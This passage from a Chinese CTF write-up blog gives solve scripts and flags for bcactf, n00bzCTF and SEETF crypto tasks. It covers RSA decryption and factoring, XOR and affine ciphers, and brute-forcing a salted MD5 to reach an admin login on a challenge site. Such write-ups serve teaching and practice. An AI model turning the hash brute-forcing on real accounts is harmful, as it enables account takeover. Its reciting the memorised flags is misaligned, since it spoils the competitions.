class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> charset:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(data.count(i)), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-comment"># bcactf&#123;ch4r4ct3r_fr3qu3ncy_15_50_c00l_55aFejnb&#125;</span><br></code></pre></td></tr></table></figure><h2 id="really-secure-algorithm"><a class="markdownIt-Anchor" href="#really-secure-algorithm"></a> Really Secure Algorithm</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">c</span><span class="hljs-operator">=</span><span class="hljs-number">2464250865277757821428965675155522992457560926961269981007162702551724392855202737838222228070453790200941338664587735699257288834514629714756168098513102225910176071493495606754285130938545761358963130345627434505300662209712223707092556796463691345274980307752267846533429807624844732139940872159965514596</span><br><span class="hljs-attribute">p</span><span class="hljs-operator">=</span><span class="hljs-number">13088210551361451568469688622513897981426518145215665452575421200429661351366918393846354939929997184772996442562042682789520346956154452065929764946443447</span><br><span class="hljs-attribute">q</span><span class="hljs-operator">=</span><span class="hljs-number">1590315075423589460616307119751698143804899237034239149886381441961338087331451452499790183510691573469327467020483209974248378007574390792001615535983477</span><br><span class="hljs-attribute">e</span><span class="hljs-operator">=</span><span class="hljs-number">65537</span><br></code></pre></td></tr></table></figure><p>标准的rsa。</p><p>直接解就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>c=...<br>p=...<br>q=...<br>e=<span class="hljs-number">65537</span><br><br>d = <span class="hljs-built_in">int</span>(gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)))<br>m = <span class="hljs-built_in">pow</span>(c,d,p*q)<br><span class="hljs-built_in">print</span>(re.sub(<span class="hljs-string">&quot;1?..&quot;</span>, <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x.group())), <span class="hljs-built_in">str</span>(m)))<br><br><span class="hljs-comment"># bcactf&#123;w311_th15_15_aWkWard_Fbahu8d3&#125;</span><br></code></pre></td></tr></table></figure><p>这里输出的m就是我们的明文，只不过他不是16进制的，而是10进制的。提示里说他喜欢十进制我也是半天没理解。</p><p>如果你看m的十进制输出的话，可以看到开头是98999799这个其实就是ascii码了， b(98)c(99)a(97)c(99)。</p><h2 id="funky-factors"><a class="markdownIt-Anchor" href="#funky-factors"></a> Funky Factors</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">2451500972944572751067639135542724911455699735389455909239072706748572836232480252074031400797211301593443375562946962694274273077543664039604383719893091628336430360455909687693258270869995548362038438414271398400407702884883827901471304659858249570873108083356722001678236438255333957918061509916855914316124827985975637</span><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">564821294757794643397264923024262896319938418162067361975239043464095797026401068770491393457675494733286339893448531140461611917094383999568438980881431718162518066997760793975381905628192846966986565357045880322008658585158406186349420366526027108151457442130148185466107727095596643126951328051023864119076639932491216</span><br></code></pre></td></tr></table></figure><p>啥都没给，一般来说就是n可以直接分解。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">F:\CTFTools\yafu-1.34&gt;yafu-x64.exe<br>factor(2451500972944572751067639135542724911455699735389455909239072706748572836232480252074031400797211301593443375562946962694274273077543664039604383719893091628336430360455909687693258270869995548362038438414271398400407702884883827901471304659858249570873108083356722001678236438255333957918061509916855914316124827985975637)<br><br><br>fac: factoring 2451500972944572751067639135542724911455699735389455909239072706748572836232480252074031400797211301593443375562946962694274273077543664039604383719893091628336430360455909687693258270869995548362038438414271398400407702884883827901471304659858249570873108083356722001678236438255333957918061509916855914316124827985975637<br>fac: using pretesting plan: normal<br>fac: no tune info: using qs/gnfs crossover of 95 digits<br>div: primes less than 10000<br>fmt: 1000000 iterations<br>rho: x^2 + 3, starting 1000 iterations on C322<br>rho: x^2 + 2, starting 1000 iterations on C322<br>rho: x^2 + 1, starting 1000 iterations on C322<br>pm1: starting B1 = 150K, B2 = gmp-ecm default on C322<br>Total factoring time = 4.2737 seconds<br><br><br>***factors found***<br><br>P14 = 25854458289211<br>P308 = 94819274320962195588391046032702062340347787753861707917333803643013756112498232723436129143357983211782575094016538160601055922810359418391115604418400747711916131212069247930840360588635198701990348690076607422776450913659984003956055504691820691172367804759436721489067099363705442358971393631085988763567<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>得到p,q。解rsa即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> re<br><br>p = ...<br>q = ...<br>e= <span class="hljs-number">65537</span><br>c= ...<br><br>d = gmpy2.invert(e, q-<span class="hljs-number">1</span>)<br>m = <span class="hljs-built_in">pow</span>(c,d, q)<br><span class="hljs-built_in">print</span>(re.sub(<span class="hljs-string">&quot;1?..&quot;</span>, <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x.group())), <span class="hljs-built_in">str</span>(m)))<br><br><span class="hljs-comment"># bcactf&#123;w0w_f4ct0r1ng_l3g3nd_hAUebf29&#125;</span><br></code></pre></td></tr></table></figure><h2 id="salty"><a class="markdownIt-Anchor" href="#salty"></a> Salty</h2><p>看名字估计就是哈希了。</p><p>给的是个网站，里面的debug部分给出了一个hash和salt。题目描述是4位数字和小写字母。那么我们来爆破。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">hash</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6877ac6025ecfc8d127bfb158afd4273&quot;</span><br><span class="hljs-attribute">salt</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;NaCl-82eed&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><span class="hljs-built_in">hash</span> = <span class="hljs-string">&quot;6877ac6025ecfc8d127bfb158afd4273&quot;</span><br>salt = <span class="hljs-string">&quot;NaCl-82eed&quot;</span><br><br>char_set = [string.ascii_lowercase + string.digits <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(*char_set):<br>    passwd = <span class="hljs-string">&quot;&quot;</span>.join(i) + salt<br><br>    <span class="hljs-keyword">if</span> md5(passwd.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest() == <span class="hljs-built_in">hash</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>        <span class="hljs-keyword">break</span><br> <br><span class="hljs-comment"># bca4</span><br></code></pre></td></tr></table></figure><p>之后使用admin登录。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># bcactf&#123;1</span>_<span class="hljs-number">10</span>v<span class="hljs-number">3</span>_<span class="hljs-number">5</span>a<span class="hljs-number">1</span>ty_h@<span class="hljs-number">5</span>h_br<span class="hljs-number">0</span>w<span class="hljs-symbol">n5</span>_<span class="hljs-number">3749</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="a-fine-line"><a class="markdownIt-Anchor" href="#a-fine-line"></a> A Fine Line</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">I<span class="hljs-comment">&#x27;m carefully drawing a fine line on this piece of paper, letting each portion guide the next... (Digits and letters are 0-9 and 10-35 in their usual orders, and the underscore is 36. &#123;&#125; are not encoded but should be added in afterwards. All letters are lowercase.)</span><br><br>Hint <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">2</span><br>This uses the affine cipher, <span class="hljs-keyword">as</span> clued <span class="hljs-keyword">by</span> the title <span class="hljs-built_in">and</span> description, but <span class="hljs-keyword">with</span> an added modification.<br><br>Hint <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">Each</span> pair <span class="hljs-keyword">of</span> letters decodes the <span class="hljs-keyword">next</span>.<br></code></pre></td></tr></table></figure><p>下载下来里面是一串字符，提示说是放射密码。然后码表也给我们了。提示二说两个字符解下一个字符。所以就可以得到解法了。</p><p>放射密码一共有三个参数，一个乘数一个加数和一个模数。模数实际上是码表的长度，所以是固定的。那么两个字符解下一个其实就是两个字符作为乘数和加数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;(bc)bx6ez_unufi3bm0r0xeb&quot;</span>.replace(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>char_set = string.digits + string.ascii_lowercase + <span class="hljs-string">&quot;_&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)-<span class="hljs-number">2</span>) :<br>    key = c[i:i+<span class="hljs-number">1</span>]<br>    mul = char_set.find(key[<span class="hljs-number">0</span>])<br>    add = char_set.find(key[<span class="hljs-number">0</span>])<br>    mul_ = inverse(mul, <span class="hljs-built_in">len</span>(char_set))<br>    <br>    c[i+<span class="hljs-number">2</span>] = char_set[(mul_*(char_set.find(c[i+<span class="hljs-number">2</span>]))) % <span class="hljs-built_in">len</span>(char_set)]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(c))<br><br><span class="hljs-comment"># bc1c6wcfl4cdknw9030b01</span><br></code></pre></td></tr></table></figure><p>嗯…好像不太对。</p><p>最后发现是我们对提示的理解错了，我以为是两个字符解下一个字符，实际上是两个字符解下两个字符…而且算法写的也有点问题，改一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;(bc)bx6ez_unufi3bm0r0xeb&quot;</span>.replace(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>char_set = string.digits + string.ascii_lowercase + <span class="hljs-string">&quot;_&quot;</span><br>c = [c[<span class="hljs-number">2</span>*i:<span class="hljs-number">2</span>*i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)//<span class="hljs-number">2</span>)]<br><br>key = c[<span class="hljs-number">0</span>]<br>res = [<span class="hljs-string">&quot;bc&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c[<span class="hljs-number">1</span>:] :<br>    mul = char_set.index(key[<span class="hljs-number">0</span>])<br>    add = char_set.index(key[<span class="hljs-number">1</span>])<br>    mul_ = inverse(mul, <span class="hljs-built_in">len</span>(char_set))<br><br>    key = char_set[mul_*(char_set.index(i[<span class="hljs-number">0</span>]) - add) % <span class="hljs-built_in">len</span>(char_set)] + \<br>            char_set[mul_ * (char_set.index(i[<span class="hljs-number">1</span>]) - add) % <span class="hljs-built_in">len</span>(char_set)]<br><br>    res.append(key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(res))<br><br><span class="hljs-comment"># bcactfg2b_npjs3p4d65k1</span><br><span class="hljs-comment"># bcactf&#123;g2b_npjs3p4d65k1&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>n00bzCTF SEETF2022</title>
    <link href="/2022/06/09/n00bzCTF-SEETF2022/"/>
    <url>/2022/06/09/n00bzCTF-SEETF2022/</url>
    
    <content type="html"><![CDATA[<p>n00bz CTF 与 SEETF 2022的一些题。</p><span id="more"></span><p>这两个都没有怎么打，写了几道简单的就润了。n00bz的服务器炸了一天才好，还有附件编码错误的问题， 😦</p><h1 id="n00bz-ctf"><a class="markdownIt-Anchor" href="#n00bz-ctf"></a> n00bz CTF</h1><p>2022/6/5</p><p>好，听名字就非常适合我。</p><p>这题全部都是用Discord发的，一开始找了半天没找到题目附件… 后面看discord里面讨论好像是网站出问题没法显示链接。</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="playing-with-xor"><a class="markdownIt-Anchor" href="#playing-with-xor"></a> Playing with xor</h3><p>这题题目其实讲的不太清楚。</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br>flag = <span class="hljs-string">b&#x27;n00bz&#123;pREDACTED&#125;&#x27;</span><br>key1 = <span class="hljs-string">b&#x27;REDACTED&#x27;</span><br>enc = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>enc += xor(key1[i],flag[i])<br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment"># _\x03\x03U\x11\x1e\t]\x07J\x06\x05\x02&amp;F\x02G_4\x1dICl^\x07\x19V&amp;]\x02X\x044\x15\x15\x05J\x02Y\x0c:\x0e\x00G[h\rT\x0b\x02N</span><br><br></code></pre></td></tr></table></figure><p>通过一开始的明文 b’n00bz{p‘ 可以解出一个 1337key。然后循环用这个进行异或即可得到结果。</p><p>一开始我还以为是新接出来的key会用到下一段明文的加密，没想就这一个密钥，他这个加密函数搞得好像key和flag一样长一样。属实有些迷惑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><br>out = <span class="hljs-string">b&#x27;_\x03\x03U\x11\x1e\t]\x07J\x06\x05\x02&amp;F\x02G_4\x1dICl^\x07\x19V&amp;]\x02X\x044\x15\x15\x05J\x02Y\x0c:\x0e\x00G[h\rT\x0b\x02N&#x27;</span><br><br>flag = [<span class="hljs-string">b&#x27;n00bz&#123;p&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(out)//<span class="hljs-number">7</span>):<br>    flag.append(strxor(<span class="hljs-string">b&#x27;1337key&#x27;</span>, out[<span class="hljs-number">7</span>*i:<span class="hljs-number">7</span>*i+<span class="hljs-number">7</span>]))<br>flag.append(strxor(<span class="hljs-string">b&#x27;13&#x27;</span>, out[<span class="hljs-number">49</span>:]))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;&#x27;</span>.join(flag))<br><br><span class="hljs-comment"># n00bz&#123;pl4y1ng_w1th_x0r_m0r3_l1k3_pl4y1ng_w1th_f1r3&#125;</span><br></code></pre></td></tr></table></figure><h3 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h3><p>附件网站崩了拿不到代码。先放着。</p><p>后面从discord里面看到别人发了这个文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ct = 68915718021581205938132340378</span><br><span class="hljs-comment"># n = 22964326243465188806208175092817347325223751455203934839482603060029805229708465878030254819573089332477084079330445929855173787412006349904864930449245982063200060526847746608051441362052994064461426109292644943462306467765210530381760387813568149905672759271878822092979239650360475796179311415340966347044401497301347973838444826544061998479163636946750265778097717211762208385963205388216125639236403616607313423716206061201112615302831337395011064188536794425701313580122604533837935452384701344503773605128479669035610395170026350607423780797383865621285538151344219282466601404674101508588637419153433890102137</span><br><span class="hljs-comment"># s = 6747770137526404810839680591618349902868945426501581276399132116507818856417271976886226143238796548185022079396435297411063351895882402872038955136430497260880818613647851713479263986391308789043197324119239260033630040630976512064481721240642729114116561261667588426398515959668695454587899042998666589705506998832917739337175589667828567571421541128057015371328723095841794613223799998429126797512729366352049800447550388154359724453576012916007310993864290045596969157854816882402679820492333445924724199994952395214639223249892224753494733720946542351810699104265693993026233289328344375145590992008664182919067</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>flag = <span class="hljs-string">b&#x27;REDACTED&#x27;</span><br>flag_int = bytes_to_long(flag)<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>ct = <span class="hljs-built_in">pow</span>(flag_int,e,n)<br><span class="hljs-comment">#assert ct = 0xdeadbeefdeadbeefdeadbeef + 1337 + 1337 + 1337</span><br>d = inverse(e,phi)<br>s = <span class="hljs-built_in">pow</span>(flag_int,d,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;s = <span class="hljs-subst">&#123;s&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ct = <span class="hljs-subst">&#123;ct&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这里给出了m对e的加密和m对d加密。</p><p>那么我们有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>=</mo><mi>c</mi><mi>t</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mspace linebreak="newline"></mspace><msup><mi>m</mi><mi>d</mi></msup><mo>=</mo><mi>s</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mspace linebreak="newline"></mspace><mi>e</mi><mi>d</mi><mo>=</mo><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m^e = ct \, mod \,n \\ m^d = s \, mod \,n \\ ed = 1 \, mod \,(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p>emm, 想了一下没想出来怎么写，但是这个s实际上m的签名啊。那么我们只需要直到公钥e就行了。一般来说公钥基本上都是0x10001也就是65537。所以我就试了一下直接用0x10001对s进行验证。没想到还真是。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># n00</span>bz&#123;pl<span class="hljs-number">34</span>s<span class="hljs-number">3</span>_s<span class="hljs-number">1</span>g<span class="hljs-symbol">n_h3</span>r<span class="hljs-number">3</span>_<span class="hljs-number">4</span><span class="hljs-symbol">nd_h3</span>r<span class="hljs-number">3</span>_<span class="hljs-number">4</span><span class="hljs-symbol">nd_h3</span>r<span class="hljs-number">3.</span>..&#125;<br></code></pre></td></tr></table></figure><h1 id="seetf-2022"><a class="markdownIt-Anchor" href="#seetf-2022"></a> SEETF 2022</h1><p>2022/6/5</p><p>最后四个小时看看。</p><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> Crypto</h2><h3 id="close-enough"><a class="markdownIt-Anchor" href="#close-enough"></a> Close Enough</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag, getNextPrime<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getNextPrime(p)<br>n = p * q<br>e = <span class="hljs-number">65537</span><br><br>key = RSA.construct((n, e)).export_key().decode()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(key)<br><br>m = bytes_to_long(flag.encode())<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>素数是两个相邻的素数。</p><p>n使用证书格式给出的。用以下网站进行读取。</p><p><a href="https://the-x.cn/zh-cn/encodings/Asn1.aspx">https://the-x.cn/zh-cn/encodings/Asn1.aspx</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> libnum<br>n = <span class="hljs-number">0xspan><br>e = <span class="hljs-number">0x10001</span><br>sqrt = 